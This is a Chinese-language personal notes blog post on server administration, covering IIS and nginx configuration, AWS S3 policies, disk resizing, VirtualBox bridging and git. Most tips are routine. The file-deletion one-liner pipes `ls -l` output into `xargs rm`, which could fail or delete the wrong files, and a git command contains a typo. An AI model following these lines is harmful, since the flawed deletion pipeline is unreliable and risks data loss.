        &lt;rules&gt;
            &lt;rule name=&#34;Force HTTPS&#34; stopProcessing=&#34;true&#34;&gt;
            &lt;match url=&#34;(.*)&#34; /&gt;
            &lt;conditions&gt;
                &lt;add input=&#34;{HTTPS}&#34; pattern=&#34;off&#34; ignoreCase=&#34;true&#34; /&gt;
            &lt;/conditions&gt;
            &lt;!-- 临时重定向 --&gt;
            &lt;!-- &lt;action type=&#34;Redirect&#34; redirectType=&#34;Temporary&#34; url=&#34;https://{HTTP_HOST}/{R:1}&#34; /&gt; --&gt;
            &lt;action type=&#34;Redirect&#34; redirectType=&#34;Permanent&#34; url=&#34;https://{HTTP_HOST}/{R:1}&#34; /&gt;
            &lt;/rule&gt;
        &lt;/rules&gt;
        &lt;/rewrite&gt;
    &lt;/system.webServer&gt;
    &lt;/configuration&gt;
    ```

## find 文件性能提升
```bash
# find 查询大量文件删除时会很慢，可以用ls 配合 grep 查询需要删除的文件，然后删除
$&gt; find /path/to/directory -type f -name &#34;*.txt&#34; -exec ls -l {} \; | grep &#34;pattern&#34; | xargs rm
```

## 压力测试 `ab`` 命令解释 
```bash
# httpd-tools 
# -n: 总共要发送的请求 
# -c: 并发连接
# -r: 随机数据，防止缓存
## 例如: 50个人，每秒访问100次, 那么总共发送请求为 50 * 100 = 5000 (-n)
$&gt; ab -n 5000 -c 50 -r http://www.example.com/
```

## https页面加载http资源报错的方法
解决方案: 
1. 服务端设置`header`: `header(&#34;Content-Security-Policy: upgrade-insecure-requests&#34;);`
2. 页面设置`meta`头: `&lt;meta http-equiv=&#34;Content-Security-Policy&#34; content=&#34;upgrade-insecure-requests&#34; /&gt;`
3. 删除链接中的协议头: `&lt;script src=&#39;//cdn.bootcss.com/jquery/3.3.1/jquery.min.js&#39;&gt;&lt;/script&gt;`
4. `nginx`添加`header`: `add_header Content-Security-Policy &#34;upgrade-insecure-requests&#34;;`


## mysql 授权 ALL PRIVILEGES 时，当前用户是具备执行 ALTER USER 的权限的，但仅限于修改自己的密码，无法修改其他用户

## Windows IIS 反向代理配置 

&gt; [https://github.com/axllent/mailpit/issues/131](https://github.com/axllent/mailpit/issues/131)
1. 前置条件 
    - 安装 [`url-rewrite`](https://www.iis.net/downloads/microsoft/url-rewrite) 模块
    - 安装 [`application-request-routing`](https://www.iis.net/downloads/microsoft/application-request-routing) 模块(此项安装前，必须先安装 `url-rewrite` 模块)
2. 配置 
    - 打开`IIS`,找到 `Application Request Routing Cache`打开，点击右侧`Server Proxy Setings`,勾选 `Enable proxy`，点击右侧`应用`即可。
    - 打开`IIS`,选择网站, 打开 `URL Rewrite(URL 重写)`, 点击右侧`添加规则`，选择`空白规则`，模式配置`(.*)`,操作选择`重写`, 重写URL设置需要反向代理的地址, 例如: 需要代理到 `http://127.0.0.1:8080/`,则填写 `http://127.0.0.1:8080/{R:1}`，其他默认，保存即可。

## 亚马逊存储桶
***新建存储通无论是公开或私有，应优先考虑以下规则***    
1. 创建存储桶(可公有访问权限)  
2. 设置&#34;对象所有权&#34;为`ACL已启用`  
3. 设置&#34;对象所有权&#34;为`存储桶拥有者优先`。  
4. 将 `此存储桶的“屏蔽公共访问权限”设置`取消`阻止所有公开访问`勾选，只勾选`阻止通过新公有存储桶策略或接入点策略授予的存储桶和对象公有访问`和`阻止通过任何公有存储桶策略或接入点策略对存储桶和对象的公有和跨账户访问`，其他默认即可  

### 存储桶规则创建及示例 
- 存储桶策略
    ```json
    // 此策略是为授权 cloudfront 可访问 S3 特定存储桶的所有读取权限(通过此方法设定的可以不受存储桶默认文件权限限制。根据上述存储桶规则创建内容，默认上传权限是不允许公网读的)
    // CDN 创建时候设置 
    // Origin domain:  (&lt;存储桶名&gt;.s3.&lt;区域名&gt;.amazonaws.com)  
    // 来源访问: 来源访问控制设置 - Create new OAC
    // 其他参数默认即可 
    // 以下json可以在cdn创建成功后，通过提示窗口直接复制，然后添加到 存储桶-权限-存储桶策略 中
    {
        &#34;Version&#34;: &#34;2008-10-17&#34;,
        &#34;Id&#34;: &#34;PolicyForCloudFrontPrivateContent&#34;,
        &#34;Statement&#34;: [
            {
                &#34;Sid&#34;: &#34;AllowCloudFrontServicePrincipal&#34;,
                &#34;Effect&#34;: &#34;Allow&#34;,
                &#34;Principal&#34;: {
                    &#34;Service&#34;: &#34;cloudfront.amazonaws.com&#34;
                },
                &#34;Action&#34;: &#34;s3:GetObject&#34;,
                &#34;Resource&#34;: &#34;arn:aws:s3:::&lt;存储桶名&gt;/*&#34;,
                &#34;Condition&#34;: {
                    &#34;StringEquals&#34;: {
                        &#34;AWS:SourceArn&#34;: &#34;CND创建成功后的arn&#34;
                    }
                }
            }
        ]
    }
    ```

- 访问控制列表(ACL): 这个权限控制我测试发现似乎只是控制程序用户是否可以操作存储桶内容的。    
- s3fs 挂载: 
    ```bash
    ## https://github.com/s3fs-fuse/s3fs-fuse
    ## 注意: 启用OAC的需要使用 sigv4 才能正常连接 
    $&gt; vim /etc/fstab 
    s3fs#&lt;存储桶名&gt; &lt;挂载到的目录&gt; fuse auto,_netdev,sigv4,allow_other,passwd_file=/etc/sysconfig/passwd-s3fs,endpoint=ap-east-1,use_path_request_style,url=https://s3.ap-east-1.amazonaws.com 0 0
    ```

### 亚马逊用户策略
```json
// 方案一 
// 注意: 若是按照上面存储通步骤创建存储桶，那么需要手动打开 `权限` - `访问控制列表(ACL)` 中 所有人(公有访问权限) 的 `列出` 权限，否则通过api无法正常操作(s3 brower也需要开启此项设置)
// 以下策略用于控制仅限`特定用户`操作特定的存储桶，该策略附加给用户
{
    &#34;Version&#34;: &#34;2012-10-17&#34;,
    &#34;Statement&#34;: [
        {
            &#34;Effect&#34;: &#34;Allow&#34;,
            &#34;Action&#34;: [
                &#34;s3:*&#34;
            ],
            &#34;Resource&#34;: [
                &#34;arn:aws:s3:::&lt;存储桶名&gt;/*&#34;
            ]
        }
    ]
}
// 方案二 
// 以下策略设置在 `存储桶` - `权限` - `存储桶策略` 中，用于控制存储桶接受那个用户操作，该策略是附加给存储桶的 
// https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/example-bucket-policies.html
{
    &#34;Version&#34;: &#34;2012-10-17&#34;,
    &#34;Statement&#34;: [
        {
            &#34;Sid&#34;: &#34;AddPublicReadCannedAcl&#34;,
            &#34;Effect&#34;: &#34;Allow&#34;,
            &#34;Principal&#34;: {
                &#34;AWS&#34;: [
                    &#34;用户的ARN&#34;,
                ]
            },
            &#34;Action&#34;: [
                &#34;s3:*&#34;
            ],
            &#34;Resource&#34;: &#34;arn:aws:s3:::存储桶名/*&#34;,
            &#34;Condition&#34;: {
                &#34;StringEquals&#34;: {
                    &#34;s3:x-amz-acl&#34;: [
                        &#34;public-read&#34; // 必须指定的ACL权限
                    ]
                }
            }
        }
    ]
}
```

## gnome-shell 终端设置 title 
```bash
$&gt; export PROMPT_COMMAND=&#39;echo -ne &#34;\033]0; ${USER}@${HOSTNAME} \007&#34;&#39;
```

## 阿里云安装 alinux 操作系统安装 docker
```bash
# aliyun的两个云镜像要安装docker都得安装一个兼容插件，否则在官方仓库中找不到对应的地址 
## Alibaba Cloud Linux 2
$&gt; wget -O /etc/yum.repos.d/docker-ce.repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
$&gt; sudo yum install yum-plugin-releasever-adapter --disablerepo=* --enablerepo=plus     # 兼容插件

## Alibaba Cloud Linux 3
$&gt; dnf config-manager --add-repo=https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
$&gt; sudo dnf -y install dnf-plugin-releasever-adapter --repo alinux3-plus    # 兼容插件
```

## 亚马逊cdn 添加 elb 作为后端源，指定多备用域名无效(有其他衍生问题, 待继续测试)   
- 问题体现: 亚马逊添加`cdn`分配后，指向源站为`elb`，此时`cdn`配置多个备用域名，正常解析后，无论访问的是哪个备用域名，他们请求的最终站点始终是一个。
- 问题分析: 
    - 怀疑是`sni`的问题，`elb`和`cdn`这边所使用的证书都是通配符证书, 而在请求过程中，携带的`sni`只有主域名，而上述问题中请求到的最终站点，恰好又是`nginx`中配置的第一个。
- 解决方案:
    - 为每一个`cdn`备用域名添加一个独立的`cdn` 


## 亚马逊调整 EBS 卷大小后扩展文件系统(磁盘扩容)
```bash
### https://docs.aws.amazon.com/zh_cn/ebs/latest/userguide/recognize-expanded-volume-linux.html

## 1. 检查卷是否有分区
$&gt; sudo lsblk

## 2. 扩展分区
# $&gt; sudo growpart 需要扩展的盘 1
$&gt; sudo growpart /dev/nvme0n1 1

## 3. 扩展文件系统
# xfs
$&gt; sudo xfs_growfs -d / 
# ext4
# $&gt; sudo resize2fs &lt;挂载分区名&gt;
$&gt; sudo resize2fs /dev/nvme0n1p1
```

## 亚马逊加速器配置
&gt; https://docs.aws.amazon.com/zh_cn/global-accelerator/latest/dg/what-is-global-accelerator.html  

`AWS Global Accelerator`可以提高全球受众使用的 `Internet` 应用程序的可用性。使用标准加速器，全球加速器将 `AWS` 全球网络的流量引导到离客户端最近的区域中的终端节点。 本节主要说明`标准加速`   

- 案例: 我的服务器位于新加坡，在欧洲等其他地区访问新加坡服务器上站点很慢，正常来说，针对于站点加速应该优先使用`cdn`，但是我们的站点主要是提供`api`请求等动态的服务, 很少涉及静态资源缓存。所有选择`AWS Global Accelerator`。  
- 创建步骤(登陆`aws`后，选择 `Global Accelerator`服务， 点击`创建加速器`): 
    - `输入名称`： 输入`加速器名称`, `加速器类型`选择标准, 其他根据需求修改， 点击`下一步`。 
    - `侦听器`：录入`端口`、`协议`、`客户端亲和性` ，其中`端口`为后端对应的端口(比如我是加速后端`80`，这儿填写的就是`80`，建议一个端口一个监听器)  
    - `添加端点组`： 修改`端点组1`中的`区域`(`区域`对应的就是你需要加速的目标区域，比如我的是新加坡,这儿选择的就是新加坡`ap-southeast-1`)，其他配置默认即可。点击`下一步`。
    - `添加端点`： 点击`添加端点`, 修改`端点类型`，你后端是什么就选择什么，`端点类型`选择过后，`端点`会自动加载已有的资源信息，其他默认。 点击`创建加速器` 即完成创建。

`加速器`创建完成后会提供一个`dns`地址，将需要加速的域名直接解析上去即可。   
 
`AWS Global Accelerator`的功能和`cdn`类似，但效果比`cdn`好, 费用肯定要更高一些了。他还可以实现端口转发等其他的功能，可以自行参悟。

## 阿里云磁盘分区扩容

&gt; https://help.aliyun.com/zh/ecs/user-guide/step-2-resize-partitions-and-file-systems/?spm=a2c4g.11186623.0.0.5a193a8aP9JIh1  

```bash
# 确认分区信息
$&gt; sudo fdisk -lu

# 扩容分区
## 命令参数中的 /dev/vdb 和 1 之间需要空格分隔，1是分区编号, 是需要扩容的盘。
$&gt; type growpart || sudo yum install -y cloud-utils-growpart
$&gt; sudo yum update cloud-utils-growpart
$&gt; type sgdisk || sudo yum install -y gdisk
$&gt; sudo LC_ALL=en_US.UTF-8 growpart /dev/vdb 1 

# 扩容盘
## xfs 扩容 ,  /mnt 是挂载的目录 
$&gt; type xfs_growfs || sudo yum install -y xfsprogs
$&gt; sudo xfs_growfs /mnt

## ext 扩容
$&gt; sudo resize2fs /dev/vdb1

########################################## 
## 裸盘扩容 
$&gt; sudo resize2fs /dev/vdc 
```


## 网络故障记录
- `症状`：局域网机器网络故障，时好时坏。故障时候无法`ping`通网关(无法获取响应)，但可以`ping`通同网段的其他主机，也可以与其他主机正常通信。
- `原因`：当前主机是通过手动配置`ip`，而局域网`ip`是路由自动分配的，有其他同事在连接时候占用了当前主机配置的`ip`，从而`ip`重复导致了上诉问题。

## linux 桌面环境下，绑定指定唤起协议
- 例如 `mailto://` 唤起指定的邮件应用,下面以`he3`的`appimage`程序为例
```bash
# 创建一个desktop文件(~/.local/share/applications)
$&gt; vim ~/.local/share/applications/appimagekit-he3.desktop 
[Desktop Entry]
Name=He3
Comment=He3 desktop

X-AppImage-Version=5.0.4
Exec=/opt/tools/he3/he3.appImage %U

Icon=/opt/tools/he3/he3.png

Terminal=false
Type=Application
Categories=Application;Development;
StartupNotify=true
# 主要是这个 MimeType, he3 即为相关协议(浏览器请求 he3:// 打开此程序)
MimeType=x-scheme-handler/he3;

# 绑定协议到指定的应用上
$&gt; xdg-mime default appimagekit-he3.desktop x-scheme-handler/he3

# 查询已绑定的信息 
$&gt; xdg-mime query default x-scheme-handler/he3
```

## 解决 Virtualbox 仅主机模式无法定制IP网段的问题(仅主机模式无法连接公网的问题) 

**此方案只适合`linux`桌面系统，`windows`理论可参考设定**  
```bash
# 创建一个虚拟网桥
$&gt; sudo brctl addbr br-vbox0
# sudo ip link add name br-vbox0 type bridge

# 启用网桥和物理网卡
$&gt; sudo ip link set dev br-vbox0 up

# 为网桥设置IP地址(这个ip相当于这个网段的路由)
$&gt; sudo ip addr add 172.31.10.1/24 dev br-vbox0

# Virtualbox 创建虚拟机时候，网卡的连接方式改为桥连网卡, 然后选择创建的网桥 br-vbox0 即可(没有dhcp，需要自己手动配置服务器上的网卡信息) 

## 以上步骤完成，那么配置的虚拟机网络即为仅主机模式，且可以自定义网段 

### 构建一个systemd管理脚本
$&gt; sudo vi /etc/systemd/system/create-bridge@.service
[Unit]
Description=Create bridge br-vbox%i
After=network.target

[Service]
Type=oneshot
ExecStart=/usr/sbin/brctl addbr br-vbox%i
ExecStart=/usr/sbin/ip link set dev br-vbox%i up
ExecStart=/usr/sbin/ip addr add 172.31.1%i.1/24 dev br-vbox%i
ExecStop=/usr/sbin/ip link set dev br-vbox%i down
ExecStop=/usr/sbin/brctl delbr br-vbox%i
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target

$&gt; sudo systemctl daemon-reload 
# $&gt; sudo systemctl &lt;start|stop|status&gt; create-bridge@0.service
### 

## 开始设置该模式下的主机可连接公网
## 需要iptables支持，创建步骤和 https://blog.0x5c0f.cc/2019/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/#linux-%E4%B8%8B%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E4%B8%8A%E5%85%AC%E7%BD%91 一致 

# 物理机执行
# 允许NAT功能和网络包的转发(wlp0s20f3 为可以连接公网的网卡)
$&gt; sudo iptables -t nat -A POSTROUTING -o wlp0s20f3 -j MASQUERADE
# 允许从内网到公网的数据包转发
$&gt; sudo iptables -A FORWARD -i br-vbox0 -o wlp0s20f3 -j ACCEPT
# 允许已经建立连接的流量转发
$&gt; sudo iptables -A FORWARD -i wlp0s20f3 -o br-vbox0 -m state --state RELATED,ESTABLISHED -j ACCEPT
```

## grafana 查询错误 `[A] got error: input data must be a wide series but got type long (input refid)`
- 这个问题是在配置`grafana`警报规则时出现的，实际上这儿添加的是表达式，而不是查询标签，统计出来的结果只能是数字(看看`prometheus`的`graph`面板 )

## 通过yum安装的mysql进行升级的时候报错 `xxx file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql` 
这个错误多数出现在yum安装 `mysql5.6`、`5.7` 时  
问题:  
```bash
warning: /var/cache/yum/x86_64/7/mysql57-community/packages/mysql-community-libs-5.7.44-1.el7.x86_64.rpm: Header V4 RSA/SHA256 Signature, key ID 3a79bd29: NOKEY
Retrieving key from file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql

The GPG keys listed for the &#34;MySQL 5.7 Community Server&#34; repository are already installed but they are not correct for this package.
Check that the correct key URLs are configured for this repository.

Failing package is: mysql-community-libs-5.7.44-1.el7.x86_64
GPG Keys are configured as: file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql 
```

解决: 
```bash
# 不行就删掉原来的GPG 密钥，在重新导入
$&gt; rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2022
```

## nginx配置特定方法请求时进行密码认证
```ini
    # location  
    auth_basic &#34;Registry realm&#34;;
    # 指定除 HEAD 和 OPTIONS 方法外，其他方法都需要进行用户名/密码认证 
    # 注意： 此项设置在 docker registry 反向代理中可能不太适用，docker 在push的时候会先进行GET，如果GET没有要求认证
    # 则 docker 在push的时候就会不在携带用户名/密码校验，从而导致推送失败
    limit_except HEAD OPTIONS {
        auth_basic_user_file conf.d/.htpasswd;
    }
```

## 服务器资源不够导致的问题
&amp;emsp;&amp;emsp; 由于服务器上的`php`站点经常受到攻击，于是决定重新调整环境架构，给上个开源`waf`，部署一切正常，但是在站点正式运行的时，某个站点在访问一个查询页面时候，数据库的`cpu`使用率消耗疯狂上涨(几百倍)，开始以为是站点被传木马了，一直疯狂查代码，查了很久发现，结果是服务器资源不够，停了一些站点重新分配了下每个容器的资源使用后，目前看起来稳定了，2核8G内存跑了近60个`php`站点，不知道这是个什么水准的服务器，还是我太水优化不了😂😂😂。

## 通过`systemd`服务配置文件修改进程优先级
&amp;emsp;&amp;emsp; 在`[Service]` 下添加 `Nice=-10`。 `Nice` 进程优先级，`-20`-`19`, 数字越小，优先级越高。 还可以直接修改已启动的进程的优先级 `sudo renice -n -10 -p &lt;pid&gt;`。可以通过`sudo nice -n -10 &lt;command&gt;` 直接在启动时指定 

## GIT 删除最近几次提交记录 
```bash
# 重置到指定提交 
$&gt;  git reset --hard &lt;commit id&gt;
# 重新提交当前修改内容 并提交 
$&gt; git add . &amp;&amp; git comm -m &#39;&lt;message&gt;&#39;
# 强制重新推送到远程仓库 
$&gt; git push --force origin main

# 如果报错，原因可能就是 远程仓库禁止 强制推送 
# 错误：无法推送一些引用到 xxxxxxxxx 

# 报错要修改就只能开分支然后在推送，最后其申请合并 
```

---

> 作者: [0x5c0f](https://blog.0x5c0f.cc)  
> URL: https://blog.0x5c0f.cc/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/  

